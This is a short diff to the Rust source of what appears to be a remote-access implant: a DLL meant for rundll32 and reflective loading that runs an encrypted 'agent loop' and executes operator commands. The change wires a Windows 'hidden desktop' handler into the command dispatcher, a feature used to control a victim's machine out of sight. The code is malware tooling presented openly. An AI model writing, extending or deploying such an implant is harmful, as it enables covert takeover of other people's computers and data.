@@ -1,6 +1,9 @@
 // DLL entry point for rundll32 / reflective-load scenarios
 // Calls the same agent loop as the EXE variant.
 mod ghost;
+#[cfg(windows)]
+#[path = "hdesktop.rs"]
+mod hdesktop;
 use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
 use aes_gcm::aead::Aead;
 use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
@@ -106,8 +109,11 @@ fn un() -> String {
 }
 
 fn ex(c: &str) -> String {
-    if c.starts_with("__hd:") {
-        return "hidden desktop requires the windows agent build".into();
+    if let Some(rest) = c.strip_prefix("__hd:") {
+        #[cfg(windows)]
+        { return hdesktop::handle(rest); }
+        #[cfg(not(windows))]
+        { return "hidden desktop requires windows".into(); }
     }
     if c.starts_with("cd ") {
         return match std::env::set_current_dir(c[3..].trim()) {
